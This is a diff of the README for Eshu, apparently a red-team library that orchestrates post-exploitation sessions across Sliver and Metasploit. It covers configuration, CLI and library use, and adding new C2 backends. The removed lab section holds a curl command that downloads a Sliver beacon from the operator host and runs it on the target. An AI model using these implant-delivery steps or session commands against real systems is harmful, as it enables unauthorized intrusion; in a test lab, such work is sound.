@@ -1,81 +1,180 @@
-# Eshu Python Library v5
+# Eshu
 
-Common Language Platform for multiple Command and Control Frameworks
+A common-language platform for post-exploitation across multiple C2 frameworks (Sliver, Metasploit, and beyond).
 
-## Testing Lab Setup
-This is an environment using Docker with test targets to
-demonstrate using the Eshu CLP Python Library.
+---
 
-### To Simply Start...
-Start Daemonized services
+## 📦 Installation
 
-```console
-docker compose up -d --build
-```
-
-Then launch into the operator machine in one terminal
-```console
-docker exec -it operator /bin/bash
-```
-
-To test network connection to vulnerable machine(VM)
 ```bash
-ping 10.1.1.3
-nmap -l metasploitable2
+# Clone and install in editable mode (you can also pip install from PyPI once published)
+git clone https://github.com/ProDefense/Eshu.git
+cd Eshu
+pip install -e .
+````
+
+Eshu requires:
+
+* Python 3.7+
+* `sliver-py`
+* `pymetasploit3`
+* `toml`
+
+---
+
+## 🔧 Configuration
+
+Create a `config.toml` in your project root. Each C2 framework you want to orchestrate gets its own section.
+
+```toml
+# config.toml
+
+# — Sliver instances
+[[c2.sliver]]
+name        = "red-team-sliver"
+config_path = "/etc/sliver/red.yml"
+
+[[c2.sliver]]
+name        = "blue-team-sliver"
+config_path = "/etc/sliver/blue.yml"
+
+# — Metasploit RPC instances
+[[c2.metasploit]]
+name     = "msf-local"
+host     = "127.0.0.1"
+port     = 55552
+password = "changeme"
 ```
 
-#### Firstly, setting up Sliver Server
-In one terminal (Sliver Server):
+* **`name`**: logical alias for filtering and output.
+* **Sliver** needs `config_path` (YAML config for SliverClient).
+* **Metasploit** needs `host`/`port`/`password`.
+
+---
+
+## 🚀 Quickstart CLI
+
+After installing, Eshu exposes a `c2-orchestrator` script:
+
 ```bash
-docker exec -it operator /bin/bash
-sliver-server
-> new-operator --name operator1 --lhost localhost
-> multiplayer
+# Show help
+c2-orchestrator --help
+
+# List all sessions across every C2
+c2-orchestrator config.toml --list-sessions
+
+# List all beacons (Sliver only)
+c2-orchestrator config.toml --list-beacons
+
+# Run 'whoami' on every active session
+c2-orchestrator config.toml --cmd whoami
+
+# Increase verbosity
+c2-orchestrator config.toml --list-sessions --log-level DEBUG
 ```
 
-#### Secondly, setting up Sliver Client instance
-In second terminal (Sliver Client):
-```bash
-docker exec -it operator /bin/bash
-sliver-client import operator1_localhost.cfg
-sliver-client
-> generate beacon --seconds 5 --jitter 0 --http 10.1.1.2 --os linux --arch amd64 --name testbeacon
-> http	
+---
+
+## 📚 Quickstart Library
+
+Use Eshu programmatically in your own Python code:
+
+```python
+import logging
+from eshu import C2Orchestrator
+
+# optional: configure logging
+logging.basicConfig(level=logging.INFO,
+                    format="%(asctime)s %(levelname)s [%(name)s] %(message)s")
+
+# load your config
+orch = C2Orchestrator("config.toml")
+
+# get all sessions
+sessions = orch.get_all_sessions()
+for s in sessions:
+    print(f"{s['c2']} | {s['session_id']} | {s.get('platform')}")
+
+# run commands
+results = orch.run_on_sessions(["uname", "-a"])
+for key, output in results.items():
+    print(f"== {key} ==")
+    print("\n".join(output))
 ```
 
-#### Thirdly, set up server to transfer implant for exploitation
-In third terminal (operator workspace):
-```bash
-docker exec -it operator /bin/bash
-python -m http.server 8080
-```
+---
 
-#### Fourth, download and run implant on vulnerable machine
-In fourth terminal (metasploitable2):
-```bash
-docker exec -it metasploitable2 /bin/bash
-curl -O http://10.1.1.2:8080/testbeacon && chmod +x testbeacon && sudo service apache2 stop && ./testbeacon
-```
-Check the sliver-client terminal to see the beacon connection.
+## 🛠️ Extension: Adding a New C2
 
-#### Lastly, run main.py for simultaneous Metasploit and Sliver behavior
-In the third terminal with the http server, ctrl-c once the GET request is made and run the following in workspace#:
-```bash 
-python eshuCLP/main.py
-```
+1. **Create your C2 subclass** in `src/eshu/c2s/<yourc2>/yourc2.py`:
 
-#### Clean Up
-To stop all running containers
-```console
-docker compose stop
-```
+   ```python
+   from eshu.base_C2 import BaseC2
 
-If stopped, start again with
-```console
-docker-compose start
-```
+   class MyC2(BaseC2):
+       NAME = "myc2"
 
-To kill and remove all the running containers
-```console
-docker compose down
-```
+       @property
+       def CLIENT(self):
+           return self._client
+
+       def __init__(self, host: str, token: str):
+           self._client = MyC2Client(host, token)
+           self._client.connect()
+
+       def list_sessions(self):
+           raw = self._client.list_sessions()
+           return [
+               {"session_id": r.id, "platform": r.os, "target_host": r.host}
+               for r in raw
+           ]
+
+       def list_beacons(self):
+           return []  # if unsupported
+
+       def send_beacon_cmd(self, beacon_id, commands):
+           raise NotImplementedError
+
+       def send_session_cmd(self, session_id, commands):
+           outputs = []
+           for cmd in commands:
+               outputs.append(self._client.run(session_id, cmd))
+           return outputs
+   ```
+
+2. **Register in the map** in `eshu/orchestrator.py`:
+
+   ```python
+   from eshu.c2s.myc2.yourc2 import MyC2
+   C2_CLASS_MAP["myc2"] = MyC2
+   ```
+
+3. **Extend your `config.toml`**:
+
+   ```toml
+   [[c2.myc2]]
+   name = "foo"
+   host = "c2.example.com"
+   token = "abcdef123456"
+   ```
+
+4. **Reinstall** (if editable mode, just reload):
+
+   ```bash
+   pip install -e .
+   ```
+
+Now you can orchestrate your new C2 alongside Sliver and Metasploit.
+
+---
+
+## ⚙️ Logging & Debugging
+
+* Use `--log-level DEBUG` on the CLI or configure `logging.basicConfig(level=logging.DEBUG)` in library code to see internal steps.
+* Logs include: loaded frameworks, instantiation errors, per-session/beacon fetch, and per-command output.
+
+---
+
+## 📄 License
+
+Eshu is GPL Licensed. See [LICENSE](LICENSE) for details.
